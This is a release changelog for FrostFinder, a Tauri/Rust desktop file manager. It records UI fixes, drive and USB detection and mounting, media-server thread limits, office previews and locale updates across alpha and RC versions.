- **Sidebar size +/- buttons** — A sticky footer at the bottom of the sidebar has `−` and `+` buttons that scale all sidebar text and icons between 75%–140% of their base size. Uses the CSS custom property `--sb-scale` applied to `font-size`, `padding`, and icon `width`/`height` via `calc()`. Scale persists to `localStorage` as `ff_sb_scale`.

---

## What's in Alpha-12-r9

### Bug Fixes
- **System partitions hidden from sidebar** — `boot`, `cache`, `log`, `root`, `srv`, `tmp`, and `/boot` paths are now excluded in `classify_drive()`. Added explicit `exact_hide` list and also moved `/boot/*` into the prefix-filter so partitions like `/boot/efi` no longer appear. The sidebar now shows only meaningful storage: Root Disk, your named NVMe/SSD/HDD data partitions, USB drives, and network mounts.
- **Icon view click glitch (flash to blank then back)** — Root cause: every `render()` call in icon view destroyed `host.innerHTML` and rebuilt the entire virtual scroller from scratch, creating a blank frame. Fix: `renderIconView` now checks if `#iv-wrap` already exists for the same `{path, iconSz, count}`. If yes, it does an **incremental repaint** — walks only currently-rendered items, toggles `.sel` class and inline styles, and returns immediately without touching the DOM structure. Full rebuild only happens on directory change, icon size change, or entry count change. `_ivMeta` is stamped on `host` after every full build and invalidated in `_doRender` when the path changes.

### Features  
- **Resizable sidebar** — A 4px drag handle sits between the sidebar and content area. Drag it left/right to resize between 120px–400px. Width is persisted to `localStorage` as `ff_sb_w` and restored on startup. The handle highlights blue on hover and during drag.

> **Requires Rust recompile** — `main.rs` modified (system mount filter expanded).

---

## What's in Alpha-12-r8

### Bug Fixes
- **Gallery folder names unreadable** — `.gthumb-lbl` was using `var(--text-secondary)` (#98989f grey) making folder titles barely visible against the dark strip background. Changed to `var(--text-primary)` (#e8e8ea) so all labels are clearly white. Selected thumbs get full `#fff`. 
- **Sidebar/toolbar color change during icon view scroll** — The `body.is-scrolling` CSS rule (used to disable `backdrop-filter` during scrolling for performance) also applied `background: rgba(18,18,22,0.97)` — a near-black color visibly different from the actual sidebar `#252528` and toolbar `#2a2a2d`. The wrong background override has been removed; the rule now only disables backdrop-filter (which is the performance goal).
- **Icon view glitches on click** — Two root causes fixed: (1) `content-visibility: auto` on `.icon-item` was causing the browser to re-evaluate item visibility every time selection changed, producing a paint flash — removed. (2) Scroll restoration was setting `wrap.scrollTop` after `paint()` in an RAF, but the browser first paints a frame with `scrollTop=0`. Fixed by pre-computing spacer height (same formula as `paint()`) *before* setting `scrollTop` in the RAF, so the browser's first composite of the new `iv-wrap` already has the correct scroll position.
- **Only NVMe unmounted partitions now show all drives** — `lsblk_unmounted_removable` previously filtered to `rm=true` (hotplug/removable flag), excluding NVMe/SSD/HDD secondary partitions entirely. Replaced with `lsblk_unmounted_all` which scans every block device, uses the `TRAN` field (usb/nvme/sata/ata) plus device name prefix and `is_rotational()` to correctly classify each unmounted partition as nvme/ssd/hdd/usb, and filters out unformatted/swap partitions. The Fedora NVMe partition will now appear with a "Not mounted — click to mount" entry in Locations.

> **Requires Rust recompile** — `main.rs` modified (`lsblk_unmounted_all` replaces `lsblk_unmounted_removable`).

---

## What's in Alpha-12-r7

### Bug Fixes
- **Icon view jumps to top on click** — Clicking any file while scrolled down caused the view to snap back to the top. Root cause: `handleEntryClick` triggers `render()` → `renderIconView(host)` which wipes `host.innerHTML` and creates a fresh `#iv-wrap` at `scrollTop=0`. Fix: snapshot `{path, top}` into `state._iconScroll` in both the click handler (before `handleEntryClick`) and in `_doRender` (before the rebuild), then restore `wrap.scrollTop` in the first `requestAnimationFrame` of the new `renderIconView`. Restores only when the path hasn't changed (navigating to a new folder correctly resets scroll to 0).

### Features
- **Unmounted drives visible in sidebar** — Sidebar now shows USB/removable drives that are plugged in but not yet mounted (e.g. CachyOS doesn't auto-mount by default). They appear dimmed with a green "Not mounted — click to mount" sublabel and a ↓ mount button. Powered by a new `lsblk -J` scan (`lsblk_unmounted_removable()`) that runs alongside `/proc/mounts` parsing in both `get_drives()` and `get_sidebar_data()`. Drives are sorted: mounted before unmounted within each type.
- **One-click mount** — The mount button (↓) on an unmounted drive calls the new `mount_drive(device)` Tauri command which runs `udisksctl mount -b /dev/sdXN`. If udisksctl triggers a Polkit popup for privileges, it will appear natively. On success the sidebar refreshes and FrostFinder navigates to the new mountpoint automatically.
- **Hot-plug detection now fires on plug, not just mount** — The background watcher previously only triggered on `/proc/mounts` changes, so a USB that required manual mounting never caused the sidebar to update. The watcher now also snapshots `/sys/block` directory listing (block device names), fires `drives-changed` when either source changes, and includes unmounted drives in the emitted payload.

> **Requires Rust recompile** — `main.rs` modified (new `lsblk_unmounted_removable`, `collect_drives_with_unmounted`, `mount_drive` command, updated watcher).

---

## What's in Alpha-12-r6

### Bug Fixes
- **Icon view name truncation** — File names were clipped to 2 lines even when more space was allocated. Increased `.ico-lbl` `-webkit-line-clamp` from 2→3 and bumped `ITEM_H` from `iconSz+62` to `iconSz+78` to give the third line room to breathe. Long names like `_Inuman Sessions Vol. 2_ Pangarap…` are now fully visible.
- **Scroll bleeds sidebar/toolbar color** — Scrolling the icon view caused WebKitGTK to repaint the full composite frame, making the transparent `html`/`body` background bleed through the sidebar and toolbar momentarily. Fixed by: (1) adding `overscroll-behavior:none` to `html`, `body`, and the `#iv-wrap` scroll container; (2) adding `will-change:transform; isolation:isolate` to `.sidebar`, `.toolbar`, and `.titlebar` so they live on separate GPU compositing layers and never re-composite with the view area.
- **USB drives not appearing in sidebar** — Two issues: (a) the `drives-changed` Tauri event handler captured `prev` *after* already overwriting `state.sidebarData.drives`, so the old drive list was lost and the USB connect/disconnect toast could never fire; (b) the fallback polling interval was 2 s. Fixed the variable capture order and tightened polling to 1 s.
- **No way to clear search quickly** — Added an `✕` clear button inside the search bar that appears whenever there is text in the field (via `:has(input:not(:placeholder-shown))`). Clicking it instantly clears the query, exits search mode, and refocuses the input — same effect as pressing Escape.

---

## What's in Alpha-12-r5

### Bug Fixes
- **Gallery view JS syntax error** — `renderGalleryView` body (zoom controls, click handlers, content loaders) plus `_setupThumbObserver`, `_loadGthumb`, and `openLightboxUrl` were accidentally swallowed into the `host.innerHTML` string assignment, causing Vite's import-analysis plugin to throw a JSX parse error on the unescaped `<div` inside `lb.innerHTML`. Rewrote the `host.innerHTML` assignment as a proper backtick template literal, rebuilt the `.gthumb` strip via a `stripHtml` generator, and restored all logic as executable code.

---

## What's in Alpha-12-r4

### Bug Fixes
- UI polish and incremental fixes carried forward into r5.

---

## What's in Alpha-12-r3

### Bug Fixes
- Column view rendering and scroll position improvements.

---

## What's in Alpha-12-r2

### Bug Fixes
- Minor gallery view stability fixes and render pipeline corrections from r1.

---

## What's in Alpha-12-r1

### Bug Fixes
- **Gallery view parse error** — nested backtick template literals inside `host.innerHTML` caused Vite import analysis to fail. Fixed video/audio/doc slot innerHTML assignments to use string concatenation instead.
- **Column view Left/Right arrow keys** — handlers were dead code (generic Up/Down block returned before reaching them). Moved column arrow interception before the generic block.
- **Deep search root** — search was scoped to the deepest open subfolder in column view instead of the top-level navigated folder. Fixed to always use `columns[0].path`.
- **Search duplicate results** — parallel rayon search across top-level subdirs could return the same file from multiple workers. Added path-based dedup with a `Set`.
- **USB drive not appearing** — drives mounted under `/run/media/` or `/media/` now force type `usb` regardless of `is_usb_device()` sysfs result. `vfat`/`exfat`/`ntfs`/`fuseblk` filesystem types also trigger USB classification.
- **Gallery toolbar overlap** — Open button and zoom controls floated over video player controls. Moved into a dedicated `gallery-bar` strip between the media area and thumbnail strip. Zoom hidden for video (has native controls).

### New Features
- **Search respects view mode** — search results now render in the active view (icon view → icon grid with thumbnails, gallery → gallery with preview). List and column fall back to flat list table.
- **Ctrl+Z Undo / Ctrl+Y Redo** — undo stack (50 ops) tracks paste operations (move/copy). Redo re-applies. Delete undo not supported (items go to Trash).
- **Drive type badges** — sidebar shows NVMe / SSD / HDD / USB / NET / OPT badges with type-specific colors.
- **Breadcrumb resize handle** — drag the thin handle between breadcrumb and toolbar buttons to redistribute space. Breadcrumb also scrolls horizontally when path is long.
- **USB hot-plug detection** — Rust background thread polls `/proc/mounts` every 1.5s and emits a `drives-changed` Tauri event on change. Sidebar updates instantly with a toast notification.

### Architecture Notes
- Search listeners use event delegation on `#toolbar` (attached once in `init()`, never re-attached on re-render)
- `getVisibleEntries()` returns `state.searchResults` in search mode — icon/gallery pick them up automatically
- Drive sort order: NVMe → SSD → HDD → USB → Optical → Network
- Undo stack: `state._undoStack[]` / `state._redoStack[]`, capped at 200 entries (raised 50→200 at r30), persisted across sessions via `save_undo_history` / `load_undo_history`

---

## Known Issues / Limitations
- **Column view** search falls back to a flat list (column view requires a real directory tree; list/icon/gallery views retain their own renderers during search).
- USB detection requires either `/run/media/` mount path OR `is_usb_device()` sysfs check passing. If your distro mounts USB elsewhere, check `classify_drive()` in `main.rs`.

---

## File Structure

```
frostfinder/
├── src/
│   ├── main.js          — app state, navigation, keyboard, search, sidebar, toolbar
│   ├── views.js         — renderColumnView, renderListView, renderIconView, renderGalleryView
│   ├── utils.js         — icons, fileColor, fileIcon, driveIcon, driveTypeBadge, fmtSize
│   ├── style.css        — all styles
│   └── search.worker.js — off-thread search/sort web worker
├── src-tauri/src/
│   └── main.rs          — Rust backend: filesystem, search, drives, thumbnails, media server
├── RELEASE.md           — this file
└── index.html
```

## v1.0.1-RC2-R4 — 2026-04-02

### Bug fixes
- **JS syntax: `#adv-save` async handler** — `click` listener in the advanced-search save
  flow was missing `async`, causing a runtime "await outside async function" error that
  crashed the Vite dev build entirely.
- **JS syntax: `#btn-restore-trash` listener** — a bad edit left the restore-selected
  listener wired as `});?.addEventListener(...)` (the `document.getElementById(...)` call
  was dropped), producing an invalid-token parse error.
- **JS syntax: missing `});` in `renderTrashBanner`** — the empty-trash `click` handler
  inside the `.then()` block was never closed before the restore listener began, and the
  `.catch()` block was missing its own closing `});`, leaving two unclosed call-expression
  arguments.
- **JS syntax: missing `}` closing `showContextMenu`** — the `showContextMenu` function
  body was never closed before `closeContextMenu` was declared, making every subsequent
  function declaration nested one level deep and causing an "Unexpected end of input" error
  at the module EOF. All four errors were pre-existing and prevented the Vite frontend from
  loading.

## v1.0.1-RC2-R5 — 2026-04-02

### Bug fixes
- **Media server OOM crash (system-level)** — the media HTTP server spawned one
  unbounded OS thread per TCP connection with no cap and no socket timeout.
  Audio playback drives a burst of range requests (initial probe, buffer chunks,
  seek probes, Web Audio API intercepts); rapid seeking could create hundreds of
  threads within seconds, exhausting virtual memory and crashing the system via
  the OOM killer.  Fixed with three changes in `start_media_server()`:
  - **Thread cap**: `MEDIA_ACTIVE` atomic counter + `MEDIA_MAX_THREADS = 32`;
    connections are dropped (browser retries) when the cap is reached.
  - **Socket timeouts**: 30 s read + write timeout on every connection so hung
    clients (disconnected mid-seek) release their thread promptly.
  - **512 KB stack**: `thread::Builder::stack_size(512 * 1024)` replaces the
    8 MB Linux default, reducing per-thread virtual memory by 16x.

  **Requires Rust recompile.**
## v1.0.1-RC2-R6 — 2026-04-02

### Improvements
- **Office file previews wired** — DOCX, XLSX, PPTX, ODT, ODS, ODP files now
  attempt a LibreOffice → PDF conversion via `get_office_preview`. If LibreOffice
  is installed the preview panel (and gallery) upgrades from raw extracted text to
  a full-fidelity PDF iframe. Without LibreOffice the text-extraction fallback is
  still shown, now with a labelled banner ("Word Document — text preview") and an
  "Install LibreOffice for full preview" hint.
- **Image dimensions no longer depend on `exiftool`** — `loadPreview` now calls
  `get_exif_tags` (native `kamadak-exif`) instead of `get_file_meta_exif`
  (exiftool subprocess) to read `ImageWidth`/`ImageHeight` for the preview panel.
  `ExifData` extended with `image_width` / `image_height` from EXIF tags
  `PixelXDimension` / `PixelYDimension` (with `ImageWidth` / `ImageLength` fallback).
- **Suppressed `unused import: Accessor` build warning** in `get_audio_tags`; renamed
  to `Accessor as _` to keep the trait in scope without the lint.

### Requires Rust recompile
`src-tauri/src/main.rs` — `ExifData` struct and `get_exif_tags` extended.
## v1.0.1-RC2-R7 — 2026-04-02

### Bug fixes
- **Drag-and-drop column update lag** — both source and destination columns now
  update immediately on drop, without waiting for the full file operation to
  finish. Previously both columns stayed stale until the entire move/copy
  completed (could be seconds for large files).

  Two-part fix in `setupDropTarget`'s drop handler (`src/main.js`):

  - **Optimistic source remove (move only)**: the dragged entries are
    immediately spliced out of `state.columns` (and pane B if it is showing
    the same directory) and `render()` is called before `invoke()` fires.
    If the op is cancelled or errors, `refreshColumns()` at the end restores
    the correct state.
  - **Optimistic destination refresh**: a `list_directory_fast` IPC call for
    the destination path is fired concurrently with the Rust file op (not
    awaited), updating the dest column (and pane B) as soon as the OS flush
    is visible — typically within one round-trip (~5–20 ms), well before
    `ddDone` resolves. `refreshColumns()` after completion reconciles any
    ordering or metadata differences.

  No-op if the destination column is not currently open. Covers both
  main-pane columns and split-pane (pane B). No Rust changes required.### v1.0.1-RC2-R22 — 2026-04-05
- Fix: `toast.select_single_file` key was missing from all 11 non-English locale files (would have caused `check-locales.js` CI gate to exit 1); added native translations for de/es/fr/hi/ja/ko/nl/pt/ru/zh/ar — all 12 locales now have exactly 294 keys
- Fix: `_showOpenRecent` (Ctrl+Shift+E) only surfaced recently *navigated folders* (path history); now merges both recent *files* (`ff_recent_files`, tracked since R19) and recent *folders* into a single polished overlay with per-section labels, file-type ext badges, colour-coded icons, and folder icons
- Fix: `toggle-preview` action and Ctrl+P handler in views.js now set `pointer-events:none` on the resize handle when the panel is hidden, preventing phantom resize drags through a collapsed panel
- Fix: `makeTabState()` now initialises `_restoreColScrolls:{}` and `_restoreListScroll:0` so fresh tabs that become background tabs before any session-restore never fall through to `(undefined||{})` — scroll is 0 rather than potentially undefined
- QoL: Cloud sidebar section (WebDAV/rclone) now shows per-mount reachability badges — an animated grey pulse while checking, a green dot when the remote is reachable, a red dot when offline; powered by `check_cloud_remote_reachable` (already existed in Rust, now wired)
- QoL: Drive-type badges (NVMe/SSD/HDD/USB/NET/OPT) are now beautiful — glassmorphic background, coloured glow text-shadow, inset highlight, hover scale animation; cloud items have their own styled indicator instead of a plain ✕ button
- QoL: Recent overlay redesigned — card layout with section headers, icon-with-rounded-bg, file extension pill badges, muted path line, keyboard shortcut hint


